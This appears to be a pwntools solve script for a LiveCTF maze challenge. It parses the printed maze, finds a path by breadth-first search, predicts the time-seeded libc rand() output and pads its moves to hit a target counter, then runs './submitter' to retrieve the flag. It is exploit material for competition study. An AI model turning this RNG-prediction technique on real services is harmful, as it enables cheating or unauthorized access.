#!/usr/bin/env python3
from pwn import *
from ctypes import cdll
split = lambda v,sz: [v[i:i+sz] for i in range(0,len(v),sz)]
uu64 = lambda x: u64(x.ljust(8,b'\0')[:8])

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

exe = context.binary = ELF('./challenge')
libc = cdll.LoadLibrary("libc.so.6")

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = process(exe.path)
    # pause()

libc.srand(libc.time(None))

PROMPT = b': '
def send(s, endl = False, recv = True):
    if type(s) != bytes:
        if type(s) != str:
            s = f'{s}\n'
        s = s.encode()
    if endl and s[-1] != ord('\n'):
        s += b'\n'
    if PROMPT and recv:
        io.readuntil(PROMPT)
    io.send(s)

size = 29
ix, iy = 1, 1

#  for i in range(0xffffffff):
#      if libc.rand() % 0x4BD == 0x4BC:
#          print('counter', hex(i))
#          break

## read map ##

send('a')

io.readuntil(b'You cast arcane eye and send your summoned magical eye above the maze.\n')

linemap = io.readuntil(b'You are in room', drop=True).strip().decode()
maps = linemap.split(' \n')

## find star ##

target = linemap.find('*')
tx, ty = target // (size+2), target % (size+2)

print(target, tx, ty, maps[tx][ty])
print(linemap)
assert len(maps) == size and len(maps[0]) == size
assert maps[tx][ty] == '*'

## find path ##

queue = [(ix,iy)]
source = [[None for _ in range(size)] for _ in range(size)]
source[ix][iy] = (ix, iy, -1)

vdx = [0, 1, 0, -1]
vdy = [1, 0, -1, 0]
dch = 'eswn'
drev = {
    'e': 'w',
    'w': 'e',
    's': 'n',
    'n': 's',
}

while source[tx][ty] == None:
    cx, cy = queue.pop(0)
    for k, (dx, dy) in enumerate(zip(vdx, vdy)):
        nx, ny = cx + dx, cy + dy
        if 0 <= nx and nx < size and 0 <= ny and ny < size:
            if source[nx][ny] == None and maps[nx][ny] != '#':
                source[nx][ny] = (cx, cy, k)
                queue.append((nx, ny))


path = [(tx, ty, -2)]
while path[-1][-1] != -1:
    cx, cy, k = path[-1]
    path.append(source[cx][cy])
path.reverse()
print(path)

ops = ''
for cx, cy, k in path:
    if k >= 0:
        ops += dch[k]
print(len(ops), ops)

## send ##

counter = 0

for _ in range(0x24f):
    rnd = libc.rand()

for _ in ops:
    rnd = libc.rand()
    counter += 1

while True:
    rnd = libc.rand()
    counter += 1
    if rnd % 1213 == 1212:
        print(hex(rnd), rnd % 1213, counter)
        if len(ops) % 2 == counter % 2:
            break

assert 2 <= len(ops) and len(ops) <= counter
assert len(ops) % 2 == counter % 2

ops = ops[:-1] + (drev[ops[-2]] + ops[-2]) * ((counter - len(ops)) // 2) + ops[-1]
print(len(ops), ops)
assert len(ops) == counter

pause()

# context.log_level = 'debug'
for op in ops:
    send(op, recv = False)
context.log_level = 'info'

if not args.REMOTE:
    io.interactive()
else:
    io.sendline(b'./submitter')
    flag = io.recvline_contains(b'LiveCTF{').decode().strip()
    print(flag)

